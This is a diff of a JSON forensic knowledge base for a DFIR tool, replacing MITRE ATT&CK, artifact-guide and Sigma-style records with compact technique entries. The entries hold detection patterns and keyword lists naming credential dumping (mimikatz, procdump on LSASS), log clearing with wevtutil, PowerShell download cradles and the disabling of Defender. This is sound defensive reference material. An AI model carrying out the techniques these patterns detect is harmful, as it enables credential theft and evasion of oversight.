@@ -1,657 +1,153 @@
-{
-  "version": "1.0.0",
-  "description": "CaseFile Forensic Knowledge Base \u2014 curated DFIR references for grounded analysis",
-  "record_count": 22,
-  "sources": [
-    "MITRE ATT&CK v16",
-    "SANS FOR508 artifact references",
-    "Sigma rule categories",
-    "Windows forensic artifact guides"
-  ],
-  "records": [
-    {
-      "id": "ATT-T1059.001",
-      "category": "mitre_attack",
-      "technique_id": "T1059.001",
-      "name": "PowerShell Execution",
-      "tactic": "Execution",
-      "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in Windows.",
-      "artifacts": [
-        "Event Log EID 4104 (Script Block Logging)",
-        "Event Log EID 4688 (Process Creation)",
-        "Prefetch POWERSHELL.EXE-*.pf",
-        "Registry PowerShell transcription settings",
-        "ConsoleHost_history.txt"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "RECmd",
-        "pyscca"
-      ],
-      "keywords": [
-        "powershell",
-        "powershell.exe",
-        "scriptblock",
-        "4104",
-        "invoke-expression",
-        "iex",
-        "encoded",
-        "bypass"
-      ]
-    },
-    {
-      "id": "ATT-T1059.003",
-      "category": "mitre_attack",
-      "technique_id": "T1059.003",
-      "name": "Windows Command Shell",
-      "tactic": "Execution",
-      "description": "Adversaries may abuse the Windows command shell (cmd.exe) for execution. The Windows command shell is the primary command prompt on Windows systems.",
-      "artifacts": [
-        "Event Log EID 4688 (Process Creation)",
-        "Prefetch CMD.EXE-*.pf",
-        "MFT entries for batch files"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "pyscca",
-        "MFTECmd"
-      ],
-      "keywords": [
-        "cmd.exe",
-        "cmd",
-        "batch",
-        "bat",
-        "command",
-        "shell",
-        "4688"
-      ]
-    },
-    {
-      "id": "ATT-T1543.003",
-      "category": "mitre_attack",
-      "technique_id": "T1543.003",
-      "name": "Windows Service (Persistence)",
-      "tactic": "Persistence",
-      "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads. When Windows boots up, it starts programs or applications called services that perform background system functions.",
-      "artifacts": [
-        "Event Log EID 7045 (Service Installed)",
-        "Event Log EID 4697 (Service Installed)",
-        "Registry HKLM\\SYSTEM\\CurrentControlSet\\Services",
-        "Amcache.hve entries"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "RECmd",
-        "AmcacheParser"
-      ],
-      "keywords": [
-        "service",
-        "7045",
-        "4697",
-        "currentcontrolset",
-        "services",
-        "auto-start",
-        "persistence",
-        "sc.exe",
-        "sc create"
-      ]
-    },
-    {
-      "id": "ATT-T1021.002",
-      "category": "mitre_attack",
-      "technique_id": "T1021.002",
-      "name": "SMB/Windows Admin Shares",
-      "tactic": "Lateral Movement",
-      "description": "Adversaries may use valid accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.",
-      "artifacts": [
-        "Event Log EID 4624 Type 3 (Network Logon)",
-        "Event Log EID 5140 (Share Access)",
-        "Event Log EID 5145 (Detailed Share Access)",
-        "MFT entries for copied executables"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "MFTECmd"
-      ],
-      "keywords": [
-        "smb",
-        "admin share",
-        "c$",
-        "admin$",
-        "ipc$",
-        "4624",
-        "type 3",
-        "network logon",
-        "lateral",
-        "5140",
-        "5145"
-      ]
-    },
-    {
-      "id": "ATT-T1078",
-      "category": "mitre_attack",
-      "technique_id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Persistence, Privilege Escalation, Initial Access",
-      "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
-      "artifacts": [
-        "Event Log EID 4624 (Successful Logon)",
-        "Event Log EID 4625 (Failed Logon)",
-        "Event Log EID 4648 (Explicit Credential Logon)",
-        "SAM registry hive"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "RECmd"
-      ],
-      "keywords": [
-        "4624",
-        "4625",
-        "4648",
-        "logon",
-        "credential",
-        "valid account",
-        "admin",
-        "administrator",
-        "sam",
-        "rid 500"
-      ]
-    },
-    {
-      "id": "ATT-T1036.005",
-      "category": "mitre_attack",
-      "technique_id": "T1036.005",
-      "name": "Match Legitimate Name or Location (Masquerading)",
-      "tactic": "Defense Evasion",
-      "description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation.",
-      "artifacts": [
-        "Prefetch for suspicious paths",
-        "Amcache entries with unusual paths",
-        "MFT entries showing executables in temp/user directories",
-        "Process memory showing mismatched parent-child"
-      ],
-      "tools": [
-        "pyscca",
-        "AmcacheParser",
-        "MFTECmd",
-        "Volatility3"
-      ],
-      "keywords": [
-        "masquerade",
-        "fake",
-        "csrss",
-        "svchost",
-        "lsass",
-        "temp",
-        "perfmon",
-        "disguise",
-        "impersonate",
-        "legitimate name"
-      ]
-    },
-    {
-      "id": "ATT-T1070.001",
-      "category": "mitre_attack",
-      "technique_id": "T1070.001",
-      "name": "Clear Windows Event Logs",
-      "tactic": "Defense Evasion",
-      "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications.",
-      "artifacts": [
-        "Event Log EID 1102 (Audit Log Cleared)",
-        "Event Log EID 104 (System Log Cleared)",
-        "Prefetch WEVTUTIL.EXE-*.pf",
-        "MFT timestamps on .evtx files"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "pyscca",
-        "MFTECmd"
-      ],
-      "keywords": [
-        "1102",
-        "104",
-        "wevtutil",
-        "clear",
-        "cleared",
-        "event log",
-        "anti-forensics",
-        "cover tracks"
-      ]
-    },
-    {
-      "id": "ATT-T1070.004",
-      "category": "mitre_attack",
-      "technique_id": "T1070.004",
-      "name": "File Deletion",
-      "tactic": "Defense Evasion",
-      "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces.",
-      "artifacts": [
-        "Prefetch SDELETE.EXE-*.pf or SDELETE64.EXE-*.pf",
-        "MFT entries with $FILE_NAME but no $DATA",
-        "USN Journal delete records",
-        "Recycle Bin $I/$R files"
-      ],
-      "tools": [
-        "pyscca",
-        "MFTECmd"
-      ],
-      "keywords": [
-        "sdelete",
-        "delete",
-        "deleted",
-        "file deletion",
-        "anti-forensics",
-        "usn",
-        "recycle",
-        "cover tracks"
-      ]
-    },
-    {
-      "id": "ATT-T1053.005",
-      "category": "mitre_attack",
-      "technique_id": "T1053.005",
-      "name": "Scheduled Task",
-      "tactic": "Execution, Persistence, Privilege Escalation",
-      "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.",
-      "artifacts": [
-        "Event Log EID 4698 (Scheduled Task Created)",
-        "Event Log EID 106 (Task Registered)",
-        "Registry SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule",
-        "Prefetch for scheduled executables"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "RECmd",
-        "pyscca"
-      ],
-      "keywords": [
-        "scheduled task",
-        "schtasks",
-        "task scheduler",
-        "4698",
-        "106",
-        "at.exe",
-        "persistence"
-      ]
-    },
-    {
-      "id": "ATT-T1003.001",
-      "category": "mitre_attack",
-      "technique_id": "T1003.001",
-      "name": "LSASS Memory Credential Dumping",
-      "tactic": "Credential Access",
-      "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).",
-      "artifacts": [
-        "Event Log EID 4688 (Process Creation for mimikatz/procdump)",
-        "Memory analysis \u2014 lsass.exe handle access",
-        "Prefetch for credential tools",
-        "Amcache entries for credential tools"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "Volatility3",
-        "pyscca",
-        "AmcacheParser"
-      ],
-      "keywords": [
-        "lsass",
-        "mimikatz",
-        "procdump",
-        "credential",
-        "dump",
-        "sekurlsa",
-        "password",
-        "hash"
-      ]
-    },
-    {
-      "id": "ART-PREFETCH",
-      "category": "artifact_guide",
-      "name": "Windows Prefetch Analysis",
-      "description": "Prefetch files (C:\\Windows\\Prefetch\\*.pf) record application execution history including run count, last run times (up to 8), and referenced files/directories. Available on Windows client OS by default (disabled on Server unless registry-enabled).",
-      "forensic_value": "Proves program execution even after the executable is deleted. Run count and timestamps establish frequency and timeline of activity.",
-      "key_fields": [
-        "executable_name",
-        "run_count",
-        "last_run_times",
-        "volume_paths",
-        "referenced_files"
-      ],
-      "caveats": [
-        "Not available on Windows Server by default",
-        "Prefetch hash collision possible (different paths, same hash)",
-        "Last 8 run times only (Win10+), last 1 on Win7",
-        "File creation time \u2248 first execution, modification time \u2248 last execution"
-      ],
-      "tools": [
-        "pyscca",
-        "PECmd"
-      ],
-      "keywords": [
-        "prefetch",
-        "pf",
-        "execution",
-        "run count",
-        "program execution"
-      ]
-    },
-    {
-      "id": "ART-AMCACHE",
-      "category": "artifact_guide",
-      "name": "Amcache.hve Analysis",
-      "description": "The Amcache registry hive (C:\\Windows\\appcompat\\Programs\\Amcache.hve) tracks application execution and installation metadata including SHA1 hashes, file paths, sizes, and timestamps.",
-      "forensic_value": "Records SHA1 hash of executables at first execution \u2014 provides hash-based IOC matching even after file deletion. Links installer metadata to specific program installations.",
-      "key_fields": [
-        "sha1_hash",
-        "full_path",
-        "file_size",
-        "link_date",
-        "product_name",
-        "company_name"
-      ],
-      "caveats": [
-        "Schema changed significantly between Windows versions",
-        "Not all executed programs appear",
-        "SHA1 hash may be for a different version than what ran",
-        "Timestamps may reflect compilation, not execution"
-      ],
-      "tools": [
-        "AmcacheParser",
-        "RECmd"
-      ],
-      "keywords": [
-        "amcache",
-        "sha1",
-        "hash",
-        "application",
-        "installation",
-        "appcompat"
-      ]
-    },
-    {
-      "id": "ART-EVTX",
-      "category": "artifact_guide",
-      "name": "Windows Event Log Analysis",
-      "description": "Windows Event Logs (.evtx) record system, security, and application events. Security.evtx contains authentication, process creation, and privilege use events critical for incident response.",
-      "forensic_value": "Authoritative source for authentication events, service installations, process creation (with command line if auditing enabled), and security policy changes.",
-      "key_fields": [
-        "EventID",
-        "TimeCreated",
-        "Computer",
-        "SubjectUserName",
-        "TargetUserName",
-        "IpAddress",
-        "ProcessName",
-        "CommandLine"
-      ],
-      "key_event_ids": {
-        "4624": "Successful Logon",
-        "4625": "Failed Logon",
-        "4648": "Explicit Credential Logon",
-        "4688": "Process Creation",
-        "4697": "Service Installed (Security)",
-        "7045": "Service Installed (System)",
-        "1102": "Audit Log Cleared",
-        "4698": "Scheduled Task Created",
-        "4720": "User Account Created",
-        "4732": "Member Added to Local Group"
-      },
-      "caveats": [
-        "Event logs can be cleared (EID 1102 records this)",
-        "Log rotation may lose older events",
-        "Process command line logging requires Advanced Audit Policy",
-        "Not all events are security-relevant"
-      ],
-      "tools": [
-        "EvtxECmd",
-        "Hayabusa"
-      ],
-      "keywords": [
-        "event log",
-        "evtx",
-        "security",
-        "system",
-        "4624",
-        "4688",
-        "7045",
-        "logon"
-      ]
-    },
-    {
-      "id": "ART-MFT",
-      "category": "artifact_guide",
-      "name": "NTFS $MFT Analysis",
-      "description": "The Master File Table ($MFT) is the core metadata structure of the NTFS file system. Every file and directory on an NTFS volume has at least one entry in the MFT containing timestamps, file sizes, and data locations.",
-      "forensic_value": "Provides four sets of timestamps per file (Created, Modified, Accessed, Entry Modified for both $STANDARD_INFORMATION and $FILE_NAME attributes). $FILE_NAME timestamps are harder to tamper with, enabling timestomping detection.",
-      "key_fields": [
-        "FileName",
-        "ParentPath",
-        "Created0x10",
-        "LastModified0x10",
-        "Created0x30",
-        "LastModified0x30",
-        "FileSize",
-        "IsDirectory"
-      ],
-      "caveats": [
-        "$STANDARD_INFORMATION timestamps can be modified by user-mode tools (timestomping)",
-        "$FILE_NAME timestamps are updated by the kernel and resist tampering",
-        "Comparing $SI vs $FN timestamps detects timestomping",
-        "Deleted file MFT entries may be overwritten"
-      ],
-      "tools": [
-        "MFTECmd",
-        "icat",
-        "fls"
-      ],
-      "keywords": [
-        "mft",
-        "ntfs",
-        "timestamp",
-        "timestomping",
-        "standard_information",
-        "file_name",
-        "created",
-        "modified"
-      ]
-    },
-    {
-      "id": "ART-REGISTRY",
-      "category": "artifact_guide",
-      "name": "Windows Registry Analysis",
-      "description": "The Windows Registry is a hierarchical database storing system configuration, user preferences, and application settings. Key hives for forensics: SAM, SECURITY, SYSTEM, SOFTWARE, NTUSER.DAT, UsrClass.dat.",
-      "forensic_value": "Records service configurations, startup programs, user activity (recent docs, typed URLs), USB device history, network connections, and installed software with timestamps.",
-      "key_locations": {
-        "services": "HKLM\\SYSTEM\\CurrentControlSet\\Services",
-        "run_keys": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-        "user_run_keys": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-        "sam_users": "HKLM\\SAM\\SAM\\Domains\\Account\\Users",
-        "network_list": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList",
-        "usb_devices": "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR"
-      },
-      "caveats": [
-        "Registry timestamps are per-key, not per-value",
-        "Deleted keys may be recoverable from unallocated hive space",
-        "Last write time updates when any value under the key changes",
-        "CurrentControlSet number determined from SYSTEM\\Select\\Current"
-      ],
-      "tools": [
-        "RECmd",
-        "Registry Explorer"
-      ],
-      "keywords": [
-        "registry",
-        "hive",
-        "sam",
-        "system",
-        "software",
-        "ntuser",
-        "services",
-        "run key",
-        "persistence"
-      ]
-    },
-    {
-      "id": "ART-MEMORY",
-      "category": "artifact_guide",
-      "name": "Memory Forensics with Volatility 3",
-      "description": "Memory forensics analyzes a snapshot of physical RAM to recover running processes, network connections, loaded modules, and other volatile artifacts not present on disk.",
-      "forensic_value": "Provides ground truth about what was running at acquisition time. Can detect hidden/injected processes, recover encryption keys, and find malware that exists only in memory.",
-      "key_plugins": {
-        "pslist": "List processes from EPROCESS linked list",
-        "psscan": "Scan for EPROCESS structures (finds hidden/unlinked processes)",
-        "netscan": "List network connections and listening ports",
-        "handles": "List handles opened by processes",
-        "dlllist": "List loaded DLLs per process",
-        "cmdline": "Show command line arguments for each process"
-      },
-      "caveats": [
-        "pslist only shows linked processes \u2014 use psscan to find hidden ones",
-        "Memory acquisition changes system state slightly",
-        "Volatility truncates ImageFileName to 14 characters",
-        "Memory analysis requires correct OS profile/ISF symbols"
-      ],
-      "tools": [
-        "Volatility3"
-      ],
-      "keywords": [
-        "memory",
-        "volatility",
-        "pslist",
-        "psscan",
-        "netscan",
-        "process",
-        "pid",
-        "running",
-        "live",
-        "ram"
-      ]
-    },
-    {
-      "id": "SIG-SERVICE-INSTALL",
-      "category": "sigma_rule",
-      "name": "Suspicious Service Installation",
-      "description": "Detects installation of services with suspicious characteristics such as execution from temp directories, hex-named services, or services with unusual binary paths.",
-      "detection_logic": "EID 7045 where ServiceName matches hex pattern OR ImagePath contains \\temp\\ OR ImagePath contains \\perfmon\\",
-      "false_positives": [
-        "Legitimate software installers",
-        "IT management tools",
-        "Antivirus updates"
-      ],
-      "severity": "high",
-      "keywords": [
-        "7045",
-        "service",
-        "install",
-        "suspicious",
-        "hex",
-        "temp",
-        "persistence"
-      ]
-    },
-    {
-      "id": "SIG-LATERAL-MOVEMENT",
-      "category": "sigma_rule",
-      "name": "Lateral Movement via Network Logon",
-      "description": "Detects potential lateral movement through network logon events (Type 3) from internal IP addresses, especially when combined with explicit credential use (EID 4648).",
-      "detection_logic": "EID 4624 LogonType=3 from internal RFC1918 source IP, correlated with EID 4648 explicit credential events from same source",
-      "false_positives": [
-        "Legitimate remote administration",
-        "File server access",
-        "Print server access"
-      ],
-      "severity": "medium",
-      "keywords": [
-        "lateral",
-        "4624",
-        "type 3",
-        "network logon",
-        "4648",
-        "explicit credential",
-        "movement"
-      ]
-    },
-    {
-      "id": "SIG-LOG-CLEARING",
-      "category": "sigma_rule",
-      "name": "Event Log Clearing Detected",
-      "description": "Detects clearing of Windows Event Logs, a common anti-forensics technique to hide attacker activity.",
-      "detection_logic": "EID 1102 (Security log cleared) OR EID 104 (System log cleared) OR Prefetch for wevtutil.exe with recent execution",
-      "false_positives": [
-        "Legitimate log maintenance",
-        "System administrators clearing old logs"
-      ],
-      "severity": "high",
-      "keywords": [
-        "1102",
-        "104",
-        "wevtutil",
-        "clear",
-        "log clearing",
-        "anti-forensics"
-      ]
-    },
-    {
-      "id": "SIG-PROCESS-MASQUERADE",
-      "category": "sigma_rule",
-      "name": "Process Name Masquerading",
-      "description": "Detects processes running with names of legitimate Windows binaries (csrss.exe, svchost.exe, lsass.exe) but from non-standard paths.",
-      "detection_logic": "Process name matches known system binary BUT parent path is not \\Windows\\System32\\ or expected location",
-      "false_positives": [
-        "Software using same executable names legitimately (rare)"
-      ],
-      "severity": "critical",
-      "keywords": [
-        "masquerade",
-        "csrss",
-        "svchost",
-        "lsass",
-        "fake",
-        "wrong path",
-        "impersonate"
-      ]
-    },
-    {
-      "id": "REF-TIMELINE",
-      "category": "methodology",
-      "name": "UTC Timeline Construction",
-      "description": "A coherent UTC timeline correlates events across multiple artifact sources (event logs, prefetch, MFT, registry, memory) to establish the sequence of attacker actions. All timestamps must be normalized to UTC before correlation.",
-      "best_practices": [
-        "Normalize all timestamps to UTC before comparison",
-        "Cross-reference at least 2 independent sources for key events",
-        "Account for timezone offsets in artifact-specific formats",
-        "Note clock skew between systems in multi-host investigations",
-        "Timeline events should be ordered chronologically with source attribution"
-      ],
-      "keywords": [
-        "timeline",
-        "utc",
-        "chronological",
-        "correlation",
-        "sequence",
-        "timestamp"
-      ]
-    },
-    {
-      "id": "REF-CROSS-CORRELATION",
-      "category": "methodology",
-      "name": "Cross-Source Evidence Correlation",
-      "description": "Correlating findings across multiple independent artifact sources increases confidence and detects inconsistencies. A process confirmed in both prefetch (execution evidence) and memory (running at acquisition time) is stronger than either alone.",
-      "best_practices": [
-        "CONFIRMED = 2+ independent sources agree",
-        "INFERRED = single source, consistent with other evidence",
-        "Flag contradictions between sources as separate findings",
-        "Process in memory + prefetch + amcache = highest confidence",
-        "Missing from one source is not contradiction \u2014 absence is not evidence of absence"
-      ],
-      "keywords": [
-        "correlation",
-        "cross-reference",
-        "confirmed",
-        "inferred",
-        "multiple sources",
-        "independent"
-      ]
-    }
-  ]
-}
+[
+  {"id": "ATT-T1059.001", "source": "mitre_attack", "technique_id": "T1059.001", "title": "PowerShell", "content": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Detection: Monitor for PowerShell processes spawned from unusual parents (Word, Excel, browser). Look for encoded commands (-enc, -encodedcommand), download cradles (IEX, Invoke-Expression, DownloadString), and execution policy bypasses (-ep bypass). Key Event IDs: 4103 (module logging), 4104 (script block logging), 400/403 (engine start/stop).", "tags": ["execution", "powershell", "windows", "T1059.001"]},
+  {"id": "ATT-T1059.003", "source": "mitre_attack", "technique_id": "T1059.003", "title": "Windows Command Shell", "content": "Adversaries may abuse the Windows command shell (cmd.exe) for execution. The Windows command shell is the primary command prompt on Windows systems. Detection: cmd.exe spawned by Office applications, browsers, or services is suspicious. Look for obfuscation via carets (c^m^d), environment variable substitution (%COMSPEC%), and chained commands. Parent process chains like winword.exe -> cmd.exe -> powershell.exe indicate macro-based execution.", "tags": ["execution", "cmd", "windows", "T1059.003"]},
+  {"id": "ATT-T1543.003", "source": "mitre_attack", "technique_id": "T1543.003", "title": "Windows Service", "content": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. Service creation is logged in Event ID 7045 (System log). Detection: New services with random names, services pointing to user-writable paths (Temp, AppData, ProgramData), services running as SYSTEM with unusual binaries, and services with DisplayName/ServiceName mismatches. Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services.", "tags": ["persistence", "service", "windows", "T1543.003", "7045"]},
+  {"id": "ATT-T1021.002", "source": "mitre_attack", "technique_id": "T1021.002", "title": "SMB/Windows Admin Shares", "content": "Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). Detection: Event ID 4648 (explicit credential logon), 4624 type 3 (network logon) to ADMIN$, C$, IPC$. Lateral movement pattern: source host authenticates to multiple targets in short timeframe. NTLM authentication to non-domain IPs indicates pass-the-hash or external C2.", "tags": ["lateral_movement", "smb", "windows", "T1021.002", "4624", "4648"]},
+  {"id": "ATT-T1078", "source": "mitre_attack", "technique_id": "T1078", "title": "Valid Accounts", "content": "Adversaries may obtain and abuse credentials of existing accounts. Detection: Logons outside normal hours, from unusual source IPs, or using accounts that do not normally authenticate interactively. Event IDs: 4624 (logon), 4625 (failed logon), 4648 (explicit credentials), 4672 (special privileges assigned). Look for accounts with both interactive and network logon types from different hosts simultaneously.", "tags": ["credential_access", "accounts", "windows", "T1078", "4624", "4625"]},
+  {"id": "ATT-T1036.005", "source": "mitre_attack", "technique_id": "T1036.005", "title": "Match Legitimate Name or Location", "content": "Adversaries may match or approximate the name or location of legitimate files when naming/placing malicious files. Common masquerading: svchost.exe outside System32, csrss.exe not running from System32 (Session 0), lsass.exe with wrong parent, explorer.exe spawning network tools. Detection: MFT full path comparison, Amcache path vs expected path, memory image path vs on-disk path.", "tags": ["defense_evasion", "masquerading", "windows", "T1036.005"]},
+  {"id": "ATT-T1070.001", "source": "mitre_attack", "technique_id": "T1070.001", "title": "Clear Windows Event Logs", "content": "Adversaries may clear Windows Event Logs to hide activity. Tools: wevtutil cl (clear-log), PowerShell Clear-EventLog, direct manipulation of .evtx files. Detection: Event ID 1102 (Security log cleared), 104 (System log cleared). Prefetch will show wevtutil.exe execution with last run timestamp. Cleared logs create a timeline gap that is itself forensically significant.", "tags": ["defense_evasion", "log_clearing", "windows", "T1070.001", "1102", "wevtutil"]},
+  {"id": "ATT-T1070.004", "source": "mitre_attack", "technique_id": "T1070.004", "title": "File Deletion", "content": "Adversaries may delete files left behind by actions to minimize presence. Tools: del, rm, sdelete (secure deletion with overwriting), cipher /w. Detection: Prefetch shows sdelete.exe/sdelete64.exe execution. MFT $BITMAP gaps indicate deleted files. USN journal entries show deletion operations. Secure deletion tools prevent recovery; their presence is itself an indicator.", "tags": ["defense_evasion", "file_deletion", "windows", "T1070.004", "sdelete"]},
+  {"id": "ATT-T1053.005", "source": "mitre_attack", "technique_id": "T1053.005", "title": "Scheduled Task/Job", "content": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. Detection: Event ID 4698 (task created), 4702 (task updated), 4700/4701 (task enabled/disabled). Task XML files in C:\\Windows\\System32\\Tasks. Registry: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache. Suspicious: tasks with random names, Base64-encoded actions, or pointing to Temp/AppData.", "tags": ["persistence", "scheduled_task", "windows", "T1053.005", "4698"]},
+  {"id": "ATT-T1003.001", "source": "mitre_attack", "technique_id": "T1003.001", "title": "LSASS Memory", "content": "Adversaries may attempt to access credential material stored in LSASS process memory. Tools: Mimikatz, procdump.exe targeting lsass.exe, Task Manager dump, comsvcs.dll MiniDump. Detection: Handles to lsass.exe from non-system processes, procdump.exe in Prefetch/Amcache, SeDebugPrivilege assigned to unusual processes (Event ID 4656), LSASS memory dump files (.dmp) in user-writable paths.", "tags": ["credential_access", "lsass", "windows", "T1003.001", "procdump", "mimikatz"]},
+  {"id": "ATT-T1027", "source": "mitre_attack", "technique_id": "T1027", "title": "Obfuscated Files or Information", "content": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents. Detection: Hex-named executables (40-char hex filenames indicate SHA1-named payloads), Base64 file contents, high entropy binaries, executables with no version info or mismatched metadata. Amcache stores SHA1 of executables at execution time.", "tags": ["defense_evasion", "obfuscation", "windows", "T1027", "hex_filename"]},
+  {"id": "ATT-T1071.002", "source": "mitre_attack", "technique_id": "T1071.002", "title": "SMB/Windows Admin Shares C2", "content": "Adversaries may communicate using the SMB protocol as an application layer protocol to avoid detection. Cobalt Strike uses SMB named pipe communication for C2 between beacons. Detection: Regular interval connections (beacon intervals of 60s, 120s, 300s, 720s common), connections to non-standard IPs on port 445, named pipe artifacts in memory (\\\\PIPE\\\\), Volatility netscan showing repeated connections to same IP.", "tags": ["command_and_control", "smb", "cobalt_strike", "windows", "T1071.002", "beaconing"]},
+  {"id": "ATT-T1036.004", "source": "mitre_attack", "technique_id": "T1036.004", "title": "Masquerade Task or Service", "content": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate. Common patterns: services named to resemble Windows services (svchost32, lsass64, msadvapi), display names copied from legitimate services, descriptions copied verbatim. Detection: Registry service entries where ImagePath points to user-writable directories, Amcache entries for service binaries outside expected paths.", "tags": ["defense_evasion", "masquerading", "service", "windows", "T1036.004"]},
+  {"id": "ATT-T1070.006", "source": "mitre_attack", "technique_id": "T1070.006", "title": "Timestomp", "content": "Adversaries may modify file time attributes to hide new or changes to existing files. MFT stores two sets of timestamps: $STANDARD_INFORMATION (user-visible, modifiable) and $FILE_NAME (NTFS kernel-maintained, harder to modify). Timestomping: $SI timestamps older than $FN timestamps indicate manipulation. Detection: MFTECmd outputs both; SI<FN flag indicates timestomping. Common pattern: attacker sets $SI to match system files (2009-2012 dates on modern malware).", "tags": ["defense_evasion", "timestomping", "mft", "windows", "T1070.006", "SI_FN"]},
+  {"id": "ATT-T1021.001", "source": "mitre_attack", "technique_id": "T1021.001", "title": "Remote Desktop Protocol", "content": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol. Detection: Event ID 4624 logon type 10 (RemoteInteractive), 4778/4779 (session connect/disconnect), TerminalServices-LocalSessionManager event 21/25. RDP artifacts: recent RDP connections in NTUSER.DAT (Terminal Server Client key), jump lists for mstsc.exe. Unusual source IPs or after-hours RDP warrants investigation.", "tags": ["lateral_movement", "rdp", "windows", "T1021.001", "4624"]},
+  {"id": "ATT-T1547.001", "source": "mitre_attack", "technique_id": "T1547.001", "title": "Registry Run Keys / Startup Folder", "content": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Common keys: HKCU/HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, RunOnce, RunServices. Detection: RECmd parses all run keys; new entries pointing to Temp/AppData/unusual paths. Amcache will show the binary was executed. MFT creation time of the binary vs run key modification time.", "tags": ["persistence", "registry", "startup", "windows", "T1547.001"]},
+  {"id": "ATT-T1055", "source": "mitre_attack", "technique_id": "T1055", "title": "Process Injection", "content": "Adversaries may inject code into processes to evade process-based defenses and possibly elevate privileges. Techniques: DLL injection, process hollowing, reflective DLL loading, APC injection. Detection: Volatility malfind (executable memory regions not backed by file), dlllist (unsigned or unusual DLLs), handles (unexpected handles between processes), netscan (network connections from unexpected processes like explorer.exe).", "tags": ["defense_evasion", "privilege_escalation", "injection", "windows", "T1055"]},
+  {"id": "ATT-T1112", "source": "mitre_attack", "technique_id": "T1112", "title": "Modify Registry", "content": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques. Detection: Registry hive last write times (RECmd includes LastWrite timestamps), Amcache SHA1 of binaries that modified registry, Event ID 4657 (registry value modified, requires SACL auditing). SYSTEM, SOFTWARE, and NTUSER.DAT hives all record modification times.", "tags": ["defense_evasion", "registry", "windows", "T1112"]},
+  {"id": "ATT-T1562.001", "source": "mitre_attack", "technique_id": "T1562.001", "title": "Disable or Modify Tools", "content": "Adversaries may modify and/or disable security tools to avoid possible detection. Common: disabling Windows Defender via registry (DisableRealtimeMonitoring), stopping security services (sc stop), modifying audit policy (auditpol /set). Detection: Registry changes to HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender, Service Control Manager events 7035/7036 for security services stopping, Event ID 4719 (system audit policy changed).", "tags": ["defense_evasion", "disable_security", "windows", "T1562.001"]},
+  {"id": "ATT-T1083", "source": "mitre_attack", "technique_id": "T1083", "title": "File and Directory Discovery", "content": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information. Tools: dir, tree, Get-ChildItem, Everything, findstr. Detection: Prefetch shows dir.exe, tree.com, findstr.exe execution. Shellbags (SBECmd) show folders browsed via Explorer. Registry UserAssist shows GUI tool usage. High volume of file system queries from command line tools in short timeframe.", "tags": ["discovery", "file_discovery", "windows", "T1083", "shellbags"]},
+  {"id": "ATT-T1087.002", "source": "mitre_attack", "technique_id": "T1087.002", "title": "Domain Account Discovery", "content": "Adversaries may attempt to get a listing of domain accounts. Tools: net user /domain, net group /domain, nltest /dclist, Get-ADUser. Detection: Prefetch shows net.exe, nltest.exe execution. Event ID 4661 (domain object enumeration with SACL), Event ID 4798/4799 (user/group membership enumerated). LDAP queries to domain controller from workstation are visible in network traffic.", "tags": ["discovery", "domain", "active_directory", "windows", "T1087.002"]},
+  {"id": "ATT-T1018", "source": "mitre_attack", "technique_id": "T1018", "title": "Remote System Discovery", "content": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network. Tools: net view, ping sweep, arp -a, nmap, Advanced IP Scanner. Detection: Prefetch shows ping.exe, arp.exe, net.exe with view parameter. Netscan shows ICMP flood patterns. High volume of failed SMB connections to non-existent hosts (445 connection attempts).", "tags": ["discovery", "network_discovery", "windows", "T1018"]},
+  {"id": "ATT-T1048", "source": "mitre_attack", "technique_id": "T1048", "title": "Exfiltration Over Alternative Protocol", "content": "Adversaries may steal data by exfiltrating it over a different protocol than that used for command and control. Methods: FTP, DNS tunneling, ICMP tunneling, HTTPS to non-standard ports. Detection: Memory netscan shows connections to unusual ports (non-80/443/445). DNS query volume spikes (DNS tunneling). Large outbound transfers in network logs. Prefetch shows ftp.exe, curl.exe, wget-equivalent tools.", "tags": ["exfiltration", "windows", "T1048"]},
